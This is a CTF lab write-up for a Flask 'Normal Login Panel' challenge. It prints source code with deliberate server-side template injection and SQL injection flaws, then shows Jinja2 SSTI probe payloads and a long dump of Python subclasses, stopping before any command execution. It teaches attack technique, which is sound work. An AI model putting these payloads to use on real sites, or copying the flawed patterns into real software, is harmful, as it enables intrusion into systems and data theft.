# Simple Web - 0x04(Lab - Normal Login Panel (Flag 2))
###### tags: `CTF` `Web` `eductf`
Challenge: https://login.ctf.zoolab.org/

## Background
[Web Security 0x1](https://youtu.be/_hasOTGximc?t=5863)
## Source Code
:::spoiler code
```python=
from flask import Flask, request, render_template, render_template_string, send_file
from flask_sqlalchemy import SQLAlchemy

db = SQLAlchemy()
app = Flask(__name__)
app.config["SQLALCHEMY_DATABASE_URI"] = "sqlite:///app.db"
db.init_app(app)

with app.app_context():
  db.session.execute("""
    CREATE TABLE IF NOT EXISTS users(
      id Integer PRIMARY KEY,
      username String NOT NULL UNIQUE,
      password String,
      count Integer DEFAULT 0
    );
  """)
  db.session.execute("INSERT OR REPLACE INTO users (username, password) VALUES ('admin', 'FLAG{Un10N_s31eCt/**/F14g_fR0m_s3cr3t}')")
  db.session.commit()

def login(greet):
  if not greet:
    return send_file('app.py', mimetype='text/plain')
  else:
    return render_template_string(f"Hello {greet}")

@app.route('/', methods=["GET", "POST"])
def index():
  if request.method == "GET":
    return render_template('index.html')
  else:
    username = request.form.get('username', '')
    password = request.form.get('password', '')
    error = ''
    user = db.session.execute("SELECT username, password FROM users where username=:username", {"username":username}).first()

    if user and user[1] == password:
      return login(request.form.get('greet', ''))
    elif not user:
      error += "User doesn't exist! "

    # New feature! count login failed event
    db.session.execute("UPDATE users SET count = count + 1 WHERE username=:username", {"username": username})
    db.session.commit()
    count = db.session.execute(f"SELECT * FROM users WHERE username='{username}'").first() or [0, 0, 0, 0]
    error += f'Login faild count: {count[3]}'

    return render_template('index.html', error=error)


if __name__ == "__main__":
  app.run(host="0.0.0.0")

```
:::
### Analysis

## Exploit - SSTI
1. Observe source code
    ```python!
    def login(greet):
      if not greet:
        return send_file('app.py', mimetype='text/plain')
      else:
        return render_template_string(f"Hello {greet}")
    ...
    if user and user[1] == password:
      return login(request.form.get('greet', ''))
    ```
    If we pass the login page, it'll render `greet` parameter as template data. Obviously `SSTI` problem.
2. Burp Suite
It really has `SSTI` problem
![](https://i.imgur.com/R9uaaBQ.png)
    * Payload: `{{[].__class__}}` → Output: `<class 'list'>`
    * Payload: `{{[].__class__.__base__}}` → Output: `<class 'object'>`
    * Payload: `{{[].__class__.__base__.__subclasses__()}}` → 
        :::spoiler Output:
        ```=
        Hello [<class 'type'>
        <class 'async_generator'>
        <class 'bytearray_iterator'>
        <class 'bytearray'>
        <class 'bytes_iterator'>
        <class 'bytes'>
        <class 'builtin_function_or_method'>
        <class 'callable_iterator'>
        <class 'PyCapsule'>
        <class 'cell'>
        <class 'classmethod_descriptor'>
        <class 'classmethod'>
        <class 'code'>
        <class 'complex'>
        <class '_contextvars.Token'>
        <class '_contextvars.ContextVar'>
        <class '_contextvars.Context'>
        <class 'coroutine'>
        <class 'dict_items'>
        <class 'dict_itemiterator'>
        <class 'dict_keyiterator'>
        <class 'dict_valueiterator'>
        <class 'dict_keys'>
        <class 'mappingproxy'>
        <class 'dict_reverseitemiterator'>
        <class 'dict_reversekeyiterator'>
        <class 'dict_reversevalueiterator'>
        <class 'dict_values'>
        <class 'dict'>
        <class 'ellipsis'>
        <class 'enumerate'>
        <class 'filter'>
        <class 'float'>
        <class 'frame'>
        <class 'frozenset'>
        <class 'function'>
        <class 'generator'>
        <class 'getset_descriptor'>
        <class 'instancemethod'>
        <class 'list_iterator'>
        <class 'list_reverseiterator'>
        <class 'list'>
        <class 'longrange_iterator'>
        <class 'int'>
        <class 'map'>
        <class 'member_descriptor'>
        <class 'memoryview'>
        <class 'method_descriptor'>
        <class 'method'>
        <class 'moduledef'>
        <class 'module'>
        <class 'odict_iterator'>
        <class 'pickle.PickleBuffer'>
        <class 'property'>
        <class 'range_iterator'>
        <class 'range'>
        <class 'reversed'>
        <class 'symtable entry'>
        <class 'iterator'>
        <class 'set_iterator'>
        <class 'set'>
        <class 'slice'>
        <class 'staticmethod'>
        <class 'stderrprinter'>
        <class 'super'>
        <class 'traceback'>
        <class 'tuple_iterator'>
        <class 'tuple'>
        <class 'str_iterator'>
        <class 'str'>
        <class 'wrapper_descriptor'>
        <class 'zip'>
        <class 'types.GenericAlias'>
        <class 'anext_awaitable'>
        <class 'async_generator_asend'>
        <class 'async_generator_athrow'>
        <class 'async_generator_wrapped_value'>
        <class 'Token.MISSING'>
        <class 'coroutine_wrapper'>
        <class 'generic_alias_iterator'>
        <class 'items'>
        <class 'keys'>
        <class 'values'>
        <class 'hamt_array_node'>
        <class 'hamt_bitmap_node'>
        <class 'hamt_collision_node'>
        <class 'hamt'>
        <class 'InterpreterID'>
        <class 'managedbuffer'>
        <class 'memory_iterator'>
        <class 'method-wrapper'>
        <class 'types.SimpleNamespace'>
        <class 'NoneType'>
        <class 'NotImplementedType'>
        <class 'str_ascii_iterator'>
        <class 'types.UnionType'>
        <class 'weakref.CallableProxyType'>
        <class 'weakref.ProxyType'>
        <class 'weakref.ReferenceType'>
        <class 'EncodingMap'>
        <class 'fieldnameiterator'>
        <class 'formatteriterator'>
        <class 'BaseException'>
        <class '_frozen_importlib._ModuleLock'>
        <class '_frozen_importlib._DummyModuleLock'>
        <class '_frozen_importlib._ModuleLockManager'>
        <class '_frozen_importlib.ModuleSpec'>
        <class '_frozen_importlib.BuiltinImporter'>
        <class '_frozen_importlib.FrozenImporter'>
        <class '_frozen_importlib._ImportLockContext'>
        <class '_thread.lock'>
        <class '_thread.RLock'>
        <class '_thread._localdummy'>
        <class '_thread._local'>
        <class '_io._IOBase'>
        <class '_io.IncrementalNewlineDecoder'>
        <class '_io._BytesIOBuffer'>
        <class 'posix.ScandirIterator'>
        <class 'posix.DirEntry'>
        <class '_frozen_importlib_external.WindowsRegistryFinder'>
        <class '_frozen_importlib_external._LoaderBasics'>
        <class '_frozen_importlib_external.FileLoader'>
        <class '_frozen_importlib_external._NamespacePath'>
        <class '_frozen_importlib_external.NamespaceLoader'>
        <class '_frozen_importlib_external.PathFinder'>
        <class '_frozen_importlib_external.FileFinder'>
        <class 'codecs.Codec'>
        <class 'codecs.IncrementalEncoder'>
        <class 'codecs.IncrementalDecoder'>
        <class 'codecs.StreamReaderWriter'>
        <class 'codecs.StreamRecoder'>
        <class '_abc._abc_data'>
        <class 'abc.ABC'>
        <class 'collections.abc.Hashable'>
        <class 'collections.abc.Awaitable'>
        <class 'collections.abc.AsyncIterable'>
        <class 'collections.abc.Iterable'>
        <class 'collections.abc.Sized'>
        <class 'collections.abc.Container'>
        <class 'collections.abc.Callable'>
        <class 'os._wrap_close'>
        <class '_sitebuiltins.Quitter'>
        <class '_sitebuiltins._Printer'>
        <class '_sitebuiltins._Helper'>
        <class '_distutils_hack._TrivialRe'>
        <class '_distutils_hack.DistutilsMetaFinder'>
        <class '_distutils_hack.shim'>
        <class 'itertools.accumulate'>
        <class 'itertools.combinations'>
        <class 'itertools.combinations_with_replacement'>
        <class 'itertools.cycle'>
        <class 'itertools.dropwhile'>
        <class 'itertools.takewhile'>
        <class 'itertools.islice'>
        <class 'itertools.starmap'>
        <class 'itertools.chain'>
        <class 'itertools.compress'>
        <class 'itertools.filterfalse'>
        <class 'itertools.count'>
        <class 'itertools.zip_longest'>
        <class 'itertools.pairwise'>
        <class 'itertools.permutations'>
        <class 'itertools.product'>
        <class 'itertools.repeat'>
        <class 'itertools.groupby'>
        <class 'itertools._grouper'>
        <class 'itertools._tee'>
        <class 'itertools._tee_dataobject'>
        <class 'operator.attrgetter'>
        <class 'operator.itemgetter'>
        <class 'operator.methodcaller'>
        <class 'reprlib.Repr'>
        <class 'collections.deque'>
        <class '_collections._deque_iterator'>
        <class '_collections._deque_reverse_iterator'>
        <class '_collections._tuplegetter'>
        <class 'collections._Link'>
        <class 'types.DynamicClassAttribute'>
        <class 'types._GeneratorWrapper'>
        <class 'functools.partial'>
        <class 'functools._lru_cache_wrapper'>
        <class 'functools.KeyWrapper'>
        <class 'functools._lru_list_elem'>
        <class 'functools.partialmethod'>
        <class 'functools.singledispatchmethod'>
        <class 'functools.cached_property'>
        <class 'enum.nonmember'>
        <class 'enum.member'>
        <class 'enum._auto_null'>
        <class 'enum.auto'>
        <class 'enum._proto_member'>
        <enum 'Enum'>
        <class 'enum.verify'>
        <class 're.Pattern'>
        <class 're.Match'>
        <class '_sre.SRE_Scanner'>
        <class 're._parser.State'>
        <class 're._parser.SubPattern'>
        <class 're._parser.Tokenizer'>
        <class 're.Scanner'>
        <class 'string.Template'>
        <class 'string.Formatter'>
        <class 'contextlib.ContextDecorator'>
        <class 'contextlib.AsyncContextDecorator'>
        <class 'contextlib._GeneratorContextManagerBase'>
        <class 'contextlib._BaseExitStack'>
        <class 'warnings.WarningMessage'>
        <class 'warnings.catch_warnings'>
        <class 'typing._Final'>
        <class 'typing._Immutable'>
        <class 'typing._NotIterable'>
        typing.Any
        <class 'typing._PickleUsingNameMixin'>
        <class 'typing._BoundVarianceMixin'>
        <class 'typing.Generic'>
        <class 'typing._TypingEllipsis'>
        <class 'typing.Annotated'>
        <class 'typing.NamedTuple'>
        <class 'typing.TypedDict'>
        <class 'typing.NewType'>
        <class 'typing.io'>
        <class 'typing.re'>
        <class 'ast.AST'>
        <class 'markupsafe._MarkupEscapeHelper'>
        <class '__future__._Feature'>
        <class '_json.Scanner'>
        <class '_json.Encoder'>
        <class 'json.decoder.JSONDecoder'>
        <class 'json.encoder.JSONEncoder'>
        <class '_struct.Struct'>
        <class '_struct.unpack_iterator'>
        <class '_pickle.Pdata'>
        <class '_pickle.PicklerMemoProxy'>
        <class '_pickle.UnpicklerMemoProxy'>
        <class '_pickle.Pickler'>
        <class '_pickle.Unpickler'>
        <class 'pickle._Framer'>
        <class 'pickle._Unframer'>
        <class 'pickle._Pickler'>
        <class 'pickle._Unpickler'>
        <class 'zlib.Compress'>
        <class 'zlib.Decompress'>
        <class '_bz2.BZ2Compressor'>
        <class '_bz2.BZ2Decompressor'>
        <class '_lzma.LZMACompressor'>
        <class '_lzma.LZMADecompressor'>
        <class '_random.Random'>
        <class '_sha512.sha384'>
        <class '_sha512.sha512'>
        <class '_weakrefset._IterationGuard'>
        <class '_weakrefset.WeakSet'>
        <class 'weakref.finalize._Info'>
        <class 'weakref.finalize'>
        <class 'tempfile._RandomNameSequence'>
        <class 'tempfile._TemporaryFileCloser'>
        <class 'tempfile._TemporaryFileWrapper'>
        <class 'tempfile.TemporaryDirectory'>
        <class '_hashlib.HASH'>
        <class '_hashlib.HMAC'>
        <class '_blake2.blake2b'>
        <class '_blake2.blake2s'>
        <class 'jinja2.bccache.Bucket'>
        <class 'jinja2.bccache.BytecodeCache'>
        <class 'ast.NodeVisitor'>
        <class 'dis._Unknown'>
        <class 'dis.Bytecode'>
        <class 'tokenize.Untokenizer'>
        <class 'inspect.BlockFinder'>
        <class 'inspect._void'>
        <class 'inspect._empty'>
        <class 'inspect.Parameter'>
        <class 'inspect.BoundArguments'>
        <class 'inspect.Signature'>
        <class 'threading._RLock'>
        <class 'threading.Condition'>
        <class 'threading.Semaphore'>
        <class 'threading.Event'>
        <class 'threading.Barrier'>
        <class 'threading.Thread'>
        <class 'urllib.parse._ResultMixinStr'>
        <class 'urllib.parse._ResultMixinBytes'>
        <class 'urllib.parse._NetlocResultMixinBase'>
        <class 'jinja2.utils.MissingType'>
        <class 'jinja2.utils.LRUCache'>
        <class 'jinja2.utils.Cycler'>
        <class 'jinja2.utils.Joiner'>
        <class 'jinja2.utils.Namespace'>
        <class 'jinja2.nodes.EvalContext'>
        <class 'jinja2.nodes.Node'>
        <class 'jinja2.visitor.NodeVisitor'>
        <class 'jinja2.idtracking.Symbols'>
        <class 'jinja2.compiler.MacroRef'>
        <class 'jinja2.compiler.Frame'>
        <class 'jinja2.runtime.TemplateReference'>
        <class 'jinja2.runtime.Context'>
        <class 'jinja2.runtime.BlockReference'>
        <class 'jinja2.runtime.LoopContext'>
        <class 'jinja2.runtime.Macro'>
        <class 'jinja2.runtime.Undefined'>
        <class 'numbers.Number'>
        <class 'jinja2.lexer.Failure'>
        <class 'jinja2.lexer.TokenStreamIterator'>
        <class 'jinja2.lexer.TokenStream'>
        <class 'jinja2.lexer.Lexer'>
        <class 'jinja2.parser.Parser'>
        <class 'jinja2.environment.Environment'>
        <class 'jinja2.environment.Template'>
        <class 'jinja2.environment.TemplateModule'>
        <class 'jinja2.environment.TemplateExpression'>
        <class 'jinja2.environment.TemplateStream'>
        <class 'importlib._abc.Loader'>
        <class 'jinja2.loaders.BaseLoader'>
        <class 'select.poll'>
        <class 'select.epoll'>
        <class 'selectors.BaseSelector'>
        <class '_socket.socket'>
        <class 'array.array'>
        <class 'array.arrayiterator'>
        <class 'socketserver.BaseServer'>
        <class 'socketserver.ForkingMixIn'>
        <class 'socketserver._NoThreads'>
        <class 'socketserver.ThreadingMixIn'>
        <class 'socketserver.BaseRequestHandler'>
        <class 'datetime.date'>
        <class 'datetime.time'>
        <class 'datetime.timedelta'>
        <class 'datetime.tzinfo'>
        <class 'calendar._localized_month'>
        <class 'calendar._localized_day'>
        <class 'calendar.Calendar'>
        <class 'calendar.different_locale'>
        <class 'email._parseaddr.AddrlistClass'>
        <class 'email.charset.Charset'>
        <class 'email.header.Header'>
        <class 'email.header._ValueFormatter'>
        <class 'email._policybase._PolicyBase'>
        <class 'email.feedparser.BufferedSubFile'>
        <class 'email.feedparser.FeedParser'>
        <class 'email.parser.Parser'>
        <class 'email.parser.BytesParser'>
        <class 'email.message.Message'>
        <class 'http.client.HTTPConnection'>
        <class '_ssl._SSLContext'>
        <class '_ssl._SSLSocket'>
        <class '_ssl.MemoryBIO'>
        <class '_ssl.SSLSession'>
        <class '_ssl.Certificate'>
        <class 'ssl.SSLObject'>
        <class 'mimetypes.MimeTypes'>
        <class 'textwrap.TextWrapper'>
        <class 'traceback._Sentinel'>
        <class 'traceback.FrameSummary'>
        <class 'traceback._ExceptionPrintContext'>
        <class 'traceback.TracebackException'>
        <class 'logging.LogRecord'>
        <class 'logging.PercentStyle'>
        <class 'logging.Formatter'>
        <class 'logging.BufferingFormatter'>
        <class 'logging.Filter'>
        <class 'logging.Filterer'>
        <class 'logging.PlaceHolder'>
        <class 'logging.Manager'>
        <class 'logging.LoggerAdapter'>
        <class 'werkzeug._internal._Missing'>
        <class 'werkzeug.exceptions.Aborter'>
        <class 'urllib.request.Request'>
        <class 'urllib.request.OpenerDirector'>
        <class 'urllib.request.BaseHandler'>
        <class 'urllib.request.HTTPPasswordMgr'>
        <class 'urllib.request.AbstractBasicAuthHandler'>
        <class 'urllib.request.AbstractDigestAuthHandler'>
        <class 'urllib.request.URLopener'>
        <class 'urllib.request.ftpwrapper'>
        <class 'http.cookiejar.Cookie'>
        <class 'http.cookiejar.CookiePolicy'>
        <class 'http.cookiejar.Absent'>
        <class 'http.cookiejar.CookieJar'>
        <class 'werkzeug.datastructures.ImmutableListMixin'>
        <class 'werkzeug.datastructures.ImmutableDictMixin'>
        <class 'werkzeug.datastructures._omd_bucket'>
        <class 'werkzeug.datastructures.Headers'>
        <class 'werkzeug.datastructures.ImmutableHeadersMixin'>
        <class 'werkzeug.datastructures.IfRange'>
        <class 'werkzeug.datastructures.Range'>
        <class 'werkzeug.datastructures.ContentRange'>
        <class 'werkzeug.datastructures.FileStorage'>
        <class 'dataclasses._HAS_DEFAULT_FACTORY_CLASS'>
        <class 'dataclasses._MISSING_TYPE'>
        <class 'dataclasses._KW_ONLY_TYPE'>
        <class 'dataclasses._FIELD_BASE'>
        <class 'dataclasses.InitVar'>
        <class 'dataclasses.Field'>
        <class 'dataclasses._DataclassParams'>
        <class 'werkzeug.sansio.multipart.Event'>
        <class 'werkzeug.sansio.multipart.MultipartDecoder'>
        <class 'werkzeug.sansio.multipart.MultipartEncoder'>
        <class 'pkgutil.ImpImporter'>
        <class 'pkgutil.ImpLoader'>
        <class 'unicodedata.UCD'>
        <class 'hmac.HMAC'>
        <class 'werkzeug.wsgi.ClosingIterator'>
        <class 'werkzeug.wsgi.FileWrapper'>
        <class 'werkzeug.wsgi._RangeWrapper'>
        <class 'werkzeug.formparser.FormDataParser'>
        <class 'werkzeug.formparser.MultiPartParser'>
        <class 'werkzeug.user_agent.UserAgent'>
        <class 'werkzeug.sansio.request.Request'>
        <class 'werkzeug.sansio.response.Response'>
        <class 'werkzeug.wrappers.response.ResponseStream'>
        <class 'werkzeug.test._TestCookieHeaders'>
        <class 'werkzeug.test._TestCookieResponse'>
        <class 'werkzeug.test.EnvironBuilder'>
        <class 'werkzeug.test.Client'>
        <class 'werkzeug.local.Local'>
        <class 'werkzeug.local.LocalManager'>
        <class 'werkzeug.local._ProxyLookup'>
        <class 'flask.globals._FakeStack'>
        <class 'decimal.Decimal'>
        <class 'decimal.Context'>
        <class 'decimal.SignalDictMixin'>
        <class 'decimal.ContextManager'>
        <class 'platform._Processor'>
        <class 'uuid.UUID'>
        <class 'flask.json.provider.JSONProvider'>
        <class 'gettext.NullTranslations'>
        <class 'click._compat._FixupStream'>
        <class 'click._compat._AtomicFile'>
        <class 'click.utils.LazyFile'>
        <class 'click.utils.KeepOpenFile'>
        <class 'click.utils.PacifyFlushWrapper'>
        <class 'click.types.ParamType'>
        <class 'click.parser.Option'>
        <class 'click.parser.Argument'>
        <class 'click.parser.ParsingState'>
        <class 'click.parser.OptionParser'>
        <class 'click.formatting.HelpFormatter'>
        <class 'click.core.Context'>
        <class 'click.core.BaseCommand'>
        <class 'click.core.Parameter'>
        <class 'werkzeug.routing.converters.BaseConverter'>
        <class 'difflib.SequenceMatcher'>
        <class 'difflib.Differ'>
        <class 'difflib.HtmlDiff'>
        <class 'pprint._safe_key'>
        <class 'pprint.PrettyPrinter'>
        <class 'werkzeug.routing.rules.RulePart'>
        <class 'werkzeug.routing.rules.RuleFactory'>
        <class 'werkzeug.routing.rules.RuleTemplate'>
        <class 'werkzeug.routing.matcher.State'>
        <class 'werkzeug.routing.matcher.StateMachineMatcher'>
        <class 'werkzeug.routing.map.Map'>
        <class 'werkzeug.routing.map.MapAdapter'>
        <class 'flask.signals.Namespace'>
        <class 'flask.signals._FakeSignal'>
        <class 'flask.cli.ScriptInfo'>
        <class 'flask.config.ConfigAttribute'>
        <class 'flask.ctx._AppCtxGlobals'>
        <class 'flask.ctx.AppContext'>
        <class 'flask.ctx.RequestContext'>
        <class 'pathlib._Flavour'>
        <class 'pathlib._Selector'>
        <class 'pathlib._TerminatingSelector'>
        <class 'pathlib.PurePath'>
        <class 'flask.scaffold.Scaffold'>
        <class 'itsdangerous.signer.SigningAlgorithm'>
        <class 'itsdangerous.signer.Signer'>
        <class 'itsdangerous.serializer.Serializer'>
        <class 'itsdangerous._json._CompactJSON'>
        <class 'flask.json.tag.JSONTag'>
        <class 'flask.json.tag.TaggedJSONSerializer'>
        <class 'flask.sessions.SessionInterface'>
        <class 'flask.blueprints.BlueprintSetupState'>
        <class 'subprocess.CompletedProcess'>
        <class 'subprocess.Popen'>
        <class 'sqlalchemy.util.compat.nullcontext'>
        <class '_csv.Dialect'>
        <class '_csv.reader'>
        <class '_csv.writer'>
        <class 'csv.Dialect'>
        <class 'csv.DictReader'>
        <class 'csv.DictWriter'>
        <class 'csv.Sniffer'>
        <class 'zipfile.ZipInfo'>
        <class 'zipfile.LZMACompressor'>
        <class 'zipfile.LZMADecompressor'>
        <class 'zipfile._SharedFile'>
        <class 'zipfile._Tellable'>
        <class 'zipfile.ZipFile'>
        <class 'zipfile.Path'>
        <class 'importlib.resources.abc.ResourceReader'>
        <class 'importlib.resources._adapters.SpecLoaderAdapter'>
        <class 'importlib.resources._adapters.TraversableResourcesLoader'>
        <class 'importlib.resources._adapters.CompatibilityFiles'>
        <class 'importlib.abc.Finder'>
        <class 'importlib.abc.MetaPathFinder'>
        <class 'importlib.abc.PathEntryFinder'>
        <class 'importlib.metadata.Sectioned'>
        <class 'importlib.metadata.DeprecatedTuple'>
        <class 'importlib.metadata.Deprecated'>
        <class 'importlib.metadata.FileHash'>
        <class 'importlib.metadata.Distribution'>
        <class 'importlib.metadata.DistributionFinder.Context'>
        <class 'importlib.metadata.FastPath'>
        <class 'importlib.metadata.Lookup'>
        <class 'importlib.metadata.Prepared'>
        <class 'configparser.Interpolation'>
        <class 'sqlalchemy.util._collections.ImmutableContainer'>
        <class 'sqlalchemy.cimmutabledict.immutabledict'>
        <class 'sqlalchemy.util._collections.Properties'>
        <class 'sqlalchemy.util._collections.IdentitySet'>
        <class 'sqlalchemy.util._collections.WeakSequence'>
        <class 'sqlalchemy.util._collections.UniqueAppender'>
        <class 'sqlalchemy.util._collections.ScopedRegistry'>
        <class 'sqlalchemy.util._preloaded._ModuleRegistry'>
        <class 'greenlet.greenlet'>
        <class 'concurrent.futures._base._Waiter'>
        <class 'concurrent.futures._base._AcquireFutures'>
        <class 'concurrent.futures._base.Future'>
        <class 'concurrent.futures._base.Executor'>
        <class 'asyncio.events.Handle'>
        <class 'asyncio.events.AbstractServer'>
        <class 'asyncio.events.AbstractEventLoop'>
        <class 'asyncio.events.AbstractEventLoopPolicy'>
        <class '_asyncio.FutureIter'>
        <class 'TaskStepMethWrapper'>
        <class '_RunningLoopHolder'>
        <class '_asyncio.Future'>
        <class 'asyncio.futures.Future'>
        <class 'asyncio.protocols.BaseProtocol'>
        <class 'asyncio.transports.BaseTransport'>
        <class 'asyncio.mixins._LoopBoundMixin'>
        <class 'asyncio.locks._ContextManagerMixin'>
        <class 'asyncio.trsock.TransportSocket'>
        <class 'asyncio.runners.Runner'>
        <class 'asyncio.streams.StreamWriter'>
        <class 'asyncio.streams.StreamReader'>
        <class 'asyncio.subprocess.Process'>
        <class 'asyncio.taskgroups.TaskGroup'>
        <class 'asyncio.timeouts.Timeout'>
        <class 'asyncio.unix_events.AbstractChildWatcher'>
        <class 'sqlalchemy.exc.HasDescriptionCode'>
        <class 'sqlalchemy.exc.DontWrapMixin'>
        <class 'sqlalchemy.util.langhelpers.safe_reraise'>
        <class 'sqlalchemy.util.langhelpers.PluginLoader'>
        <class 'sqlalchemy.util.langhelpers.portable_instancemethod'>
        <class 'sqlalchemy.util.langhelpers.memoized_property'>
        <class 'sqlalchemy.util.langhelpers.HasMemoized.memoized_attribute'>
        <class 'sqlalchemy.util.langhelpers.HasMemoized'>
        <class 'sqlalchemy.util.langhelpers.MemoizedSlots'>
        <class 'sqlalchemy.util.langhelpers.hybridproperty'>
        <class 'sqlalchemy.util.langhelpers.hybridmethod'>
        <class 'sqlalchemy.util.langhelpers.symbol'>
        <class 'sqlalchemy.util._concurrency_py3k.AsyncAdaptedLock'>
        <class 'sqlalchemy.util._compat_py3k._AsyncGeneratorContextManager'>
        <class 'sqlalchemy.sql.roles.SQLRole'>
        <class 'sqlalchemy.sql.roles.UsesInspection'>
        <class 'sqlalchemy.sql.roles.AllowsLambdaRole'>
        <class 'sqlalchemy.sql.visitors.Traversible'>
        <class 'sqlalchemy.sql.visitors.InternalTraversal'>
        <class 'sqlalchemy.sql.visitors.ExternalTraversal'>
        <class 'sqlalchemy.sql.operators.Operators'>
        <class 'sqlalchemy.sql.operators.custom_op'>
        <class 'sqlalchemy.sql.traversals.HasCacheKey'>
        <class 'sqlalchemy.sql.traversals.HasCopyInternals'>
        <class 'sqlalchemy.sql.base.Immutable'>
        <class 'sqlalchemy.sql.base.DialectKWArgs'>
        <class 'sqlalchemy.sql.base.CompileState'>
        <class 'sqlalchemy.sql.base.Options'>
        <class 'sqlalchemy.sql.base.SchemaEventTarget'>
        <class 'sqlalchemy.sql.base.ColumnCollection'>
        <class 'sqlalchemy.sql.coercions.RoleImpl'>
        <class 'sqlalchemy.sql.coercions._Deannotate'>
        <class 'sqlalchemy.sql.coercions._StringOnly'>
        <class 'sqlalchemy.sql.coercions._ReturnsStringKey'>
        <class 'sqlalchemy.sql.coercions._ColumnCoercions'>
        <class 'sqlalchemy.sql.coercions._NoTextCoercion'>
        <class 'sqlalchemy.sql.coercions._CoerceLiterals'>
        <class 'sqlalchemy.sql.coercions._SelectIsNotFrom'>
        <class 'sqlalchemy.sql.type_api.ExternalType'>
        <class 'sqlalchemy.sql.type_api.Emulated'>
        <class 'sqlalchemy.sql.type_api.NativeForEmulated'>
        <class 'sqlalchemy.sql.annotation.SupportsAnnotations'>
        <class 'sqlalchemy.sql.annotation.Annotated'>
        <class 'sqlalchemy.sql.elements.WrapsColumnExpression'>
        <class 'sqlalchemy.event.registry._EventKey'>
        <class 'sqlalchemy.event.attr._empty_collection'>
        <class 'sqlalchemy.event.base._UnpickleDispatch'>
        <class 'sqlalchemy.event.base._Dispatch'>
        <class 'sqlalchemy.event.base.Events'>
        <class 'sqlalchemy.event.base._JoinedDispatcher'>
        <class 'sqlalchemy.event.base.dispatcher'>
        <class 'sqlalchemy.cprocessors.UnicodeResultProcessor'>
        <class 'sqlalchemy.DecimalResultProcessor'>
        <class 'sqlalchemy.sql.sqltypes._LookupExpressionAdapter'>
        <class 'sqlalchemy.sql.sqltypes.Concatenable'>
        <class 'sqlalchemy.sql.sqltypes.Indexable'>
        <class 'sqlalchemy.sql.selectable.HasPrefixes'>
        <class 'sqlalchemy.sql.selectable.HasSuffixes'>
        <class 'sqlalchemy.sql.selectable.HasHints'>
        <class 'sqlalchemy.sql.selectable.NoInit'>
        <class 'sqlalchemy.sql.selectable.DeprecatedSelectBaseGenerations'>
        <class 'sqlalchemy.sql.selectable.DeprecatedSelectGenerations'>
        <class 'sqlalchemy.sql.selectable._SelectFromElements'>
        <class 'sqlalchemy.sql.schema.IdentityOptions'>
        <class 'sqlalchemy.sql.schema.ColumnCollectionMixin'>
        <class 'sqlalchemy.sql.util._repr_base'>
        <class 'sqlalchemy.sql.util.ColumnAdapter._IncludeExcludeMapping'>
        <class 'sqlalchemy.sql.dml.DMLWhereBase'>
        <class 'sqlalchemy.sql.functions._FunctionGenerator'>
        <class 'sqlalchemy.sql.compiler.Compiled'>
        <class 'sqlalchemy.sql.compiler.TypeCompiler'>
        <class 'sqlalchemy.sql.compiler.IdentifierPreparer'>
        <class 'sqlalchemy.sql.lambdas.AnalyzedCode'>
        <class 'sqlalchemy.sql.lambdas.NonAnalyzedFunction'>
        <class 'sqlalchemy.sql.lambdas.AnalyzedFunction'>
        <class 'sqlalchemy.sql.naming.ConventionDict'>
        <class 'sqlalchemy.engine.interfaces.Dialect'>
        <class 'sqlalchemy.engine.interfaces.CreateEnginePlugin'>
        <class 'sqlalchemy.engine.interfaces.ExecutionContext'>
        <class 'sqlalchemy.engine.interfaces.Connectable'>
        <class 'sqlalchemy.engine.interfaces.ExceptionContext'>
        <class 'sqlalchemy.engine.interfaces.AdaptedConnection'>
        <class 'sqlalchemy.engine.util.TransactionalContext'>
        <class 'sqlalchemy.log.Identified'>
        <class 'sqlalchemy.log.InstanceLogger'>
        <class 'sqlalchemy.log.echo_property'>
        <class 'sqlalchemy.engine.base.Engine._trans_ctx'>
        <class 'sqlalchemy.engine.base.OptionEngineMixin'>
        <class 'sqlalchemy.pool.base._ConnDialect'>
        <class 'sqlalchemy.pool.base._ConnectionRecord'>
        <class 'sqlalchemy.pool.base._ConnectionFairy'>
        <class 'sqlalchemy.util.queue.Queue'>
        <class 'sqlalchemy.util.queue.AsyncAdaptedQueue'>
        <class 'sqlalchemy.pool.dbapi_proxy._DBProxy'>
        <class 'sqlalchemy.cresultproxy.BaseRow'>
        <class 'sqlalchemy.engine.util.tuplegetter'>
        <class 'sqlalchemy.engine.result.ResultMetaData'>
        <class 'sqlalchemy.engine.result._WithKeys'>
        <class 'sqlalchemy.engine.result.FrozenResult'>
        <class 'sqlalchemy.engine.cursor.ResultFetchStrategy'>
        <class 'sqlalchemy.engine.cursor.BaseCursorResult'>
        <class 'sqlalchemy.engine.reflection.Inspector'>
        <class 'sqlalchemy.engine.default._RendersLiteral'>
        <class 'sqlalchemy.orm.base.InspectionAttr'>
        <class 'sqlalchemy.orm.base._MappedAttribute'>
        <class 'sqlalchemy.orm.collections._PlainColumnGetter'>
        <class 'sqlalchemy.orm.collections._SerializableColumnGetter'>
        <class 'sqlalchemy.orm.collections._SerializableAttrGetter'>
        <class 'sqlalchemy.orm.collections.collection'>
        <class 'sqlalchemy.orm.collections.CollectionAdapter'>
        <class 'sqlalchemy.orm.interfaces.LoaderStrategy'>
        <class 'sqlalchemy.orm.attributes.AttributeEvent'>
        <class 'sqlalchemy.orm.attributes.AttributeImpl'>
        <class 'sqlalchemy.orm.state.AttributeState'>
        <class 'sqlalchemy.orm.state.PendingCollection'>
        <class 'sqlalchemy.orm.instrumentation._SerializeManager'>
        <class 'sqlalchemy.orm.instrumentation.InstrumentationFactory'>
        <class 'sqlalchemy.orm.util.AliasedClass'>
        <class 'sqlalchemy.orm.util._WrapUserEntity'>
        <class 'sqlalchemy.orm.strategy_options.loader_option'>
        <class 'sqlalchemy.orm.loading.PostLoad'>
        <class 'sqlalchemy.orm.relationships.JoinCondition'>
        <class 'sqlalchemy.orm.relationships._ColInAnnotations'>
        <class 'sqlalchemy.orm.context.QueryContext'>
        <class 'sqlalchemy.orm.context._QueryEntity'>
        <class 'sqlalchemy.orm.clsregistry._MultipleClassMarker'>
        <class 'sqlalchemy.orm.clsregistry._ModuleMarker'>
        <class 'sqlalchemy.orm.clsregistry._ModNS'>
        <class 'sqlalchemy.orm.clsregistry._GetColumns'>
        <class 'sqlalchemy.orm.clsregistry._GetTable'>
        <class 'sqlalchemy.orm.clsregistry._class_resolver'>
        <class 'sqlalchemy.orm.decl_base._MapperConfig'>
        <class 'sqlalchemy.orm.decl_api.registry'>
        <class 'sqlalchemy.orm.identity.IdentityMap'>
        <class 'sqlalchemy.orm.query.BulkUD'>
        <class 'sqlalchemy.orm.evaluator.EvaluatorCompiler'>
        <class 'sqlalchemy.orm.persistence.ORMDMLState'>
